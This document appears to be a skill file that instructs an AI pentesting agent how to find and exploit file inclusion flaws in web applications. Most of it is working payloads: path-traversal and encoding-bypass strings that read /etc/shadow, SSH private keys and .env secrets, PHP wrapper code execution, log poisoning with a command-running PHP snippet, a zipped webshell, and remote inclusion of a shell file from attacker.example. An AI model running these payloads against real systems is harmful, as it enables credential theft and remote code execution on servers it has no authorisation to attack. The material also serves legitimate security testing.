---
name: file-inclusion
description: Detect and exploit local and remote file inclusion vulnerabilities for sensitive data access and code execution
origin: AI Threat Hunting
---

# File Inclusion Testing

> **Kali MCP audit header:** use `X-Technique: LFI` for local-file inclusion (`/etc/passwd`, PHP filter wrappers, log poisoning). Switch to `RFI` when the payload fetches a remote URL the server loads.

## When to Activate

- Parameter references file paths: `page=`, `file=`, `template=`, `include=`, `path=`, `doc=`, `lang=`
- Dynamic content loading based on user input, URL patterns like `/index.php?page=about`
- Error messages reveal file system paths

## Tools

- `curl` — manual path traversal probing and wrapper testing
- `ffuf` — automated traversal depth and path fuzzing
- `php_filter_chain_generator.py` — PHP filter chain RCE without file write (synacktiv tool)

## Methodology

### 1. LFI Detection

### Basic Path Traversal
```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?file=..%2f..%2f..%2fetc/passwd
?page=/etc/passwd
?page=..\..\..\..\windows\win.ini
?page=C:\windows\win.ini
```

### Filter Bypass Techniques
```
# Double encoding
?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
# Null byte (PHP < 5.3.4)
?page=../../../etc/passwd%00
# Dot-dot-slash variations
?page=....//....//....//etc/passwd
?page=..;/..;/..;/etc/passwd       # Tomcat/Java
?page=..%c0%af..%c0%afetc/passwd   # Overlong UTF-8
?page=..%ef%bc%8f..%ef%bc%8fetc/passwd  # Unicode fullwidth slash
# Path truncation (PHP < 5.3, 4096+ chars)
?page=../../../etc/passwd/./././././[...repeat...]
# Extension bypass
?page=php://filter/convert.base64-encode/resource=index  # reads index.php
?page=../../../etc/passwd%00.php
```

## Sensitive Files

### Linux
```
/etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ, /proc/self/cmdline
/proc/self/fd/0-20, /proc/net/tcp, /home/USER/.ssh/id_rsa
/var/log/auth.log, /var/log/apache2/access.log, /var/log/nginx/access.log
```

### Web App Files
```
/etc/apache2/sites-enabled/000-default.conf, /etc/nginx/sites-enabled/default
/var/www/html/index.php, /var/www/html/config.php, /var/www/html/.env
/var/www/html/wp-config.php, .env, config.php, config.yml, database.yml, settings.py
```

### Windows
```
C:\windows\win.ini, C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config, C:\xampp\apache\conf\httpd.conf
```

## PHP Wrappers

### php://filter — Read Source Code
```
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/convert.base64-encode/resource=config
echo "BASE64_OUTPUT" | base64 -d
```

### php://input — Code Execution (requires allow_url_include=On)
```bash
curl -X POST "http://target/index.php?page=php://input" --data "PAYLOAD: php system('id')"
```

### data:// — Code Execution (requires allow_url_include=On)
```
?page=data://text/plain,PAYLOAD: php system('id')
?page=data://text/plain;base64,BASE64_ENCODED_PHP_SYSTEM_CALL
```

### expect:// (rare, requires expect extension)
```
?page=expect://id
```

### zip:// and phar:// — Via File Upload
```
echo 'PAYLOAD: php system($_GET["cmd"])' > shell.php && zip shell.zip shell.php
?page=zip://uploads/shell.zip%23shell.php
?page=phar://uploads/shell.phar/shell.php
```

## LFI to RCE

### Log Poisoning
```bash
# Inject PHP into access log via User-Agent
curl -A "PAYLOAD: php system($_GET['cmd'])" http://target/
# Include the log file
?page=../../../var/log/apache2/access.log&cmd=id
# Alt: SSH log injection
ssh "PAYLOAD: php system($_GET['cmd'])"@target
?page=../../../var/log/auth.log&cmd=id
```

### /proc/self/environ
```
curl -A "PAYLOAD: php system('id')" "http://target/?page=../../../proc/self/environ"
```

### Session File Inclusion
```
# Session files at: /var/lib/php/sessions/sess_ID or /tmp/sess_ID
# Set session var containing PHP code, then include session file
?page=../../../var/lib/php/sessions/sess_YOUR_SESSION_ID
```

### PHP Filter Chain (No File Write)
```
python3 php_filter_chain_generator.py --chain 'PAYLOAD: php system("id")'
# Use output as inclusion parameter value
```

## Remote File Inclusion (requires allow_url_include=On)

```
?page=http://attacker.example/shell.txt    # shell.txt: PAYLOAD: php system($_GET['cmd'])
?page=http://attacker.example/shell.txt%00 # null byte to strip appended extension
?page=\\attacker.example\share\shell.php   # SMB (Windows, no allow_url_include needed)
```

## What to Record

- Vulnerable parameter and endpoint
- Traversal depth required (how many `../`)
- Encoding/bypass technique needed (null byte, double encoding, etc.)
- Files successfully read and their content (redact secrets in report)
- RCE method if achieved (log poisoning, PHP wrappers, filter chains)
- Severity: Critical (RCE), High (sensitive file read), Medium (limited file read)

## Extended Resources

- `agent/references/payloads/file-inclusion-payloads.md` — path traversal, PHP wrappers, null byte, log poisoning, interesting files
- `agent/references/payloads/directory-traversal-payloads.md` — encoding variants, null byte, double URL encoding, OS-specific paths
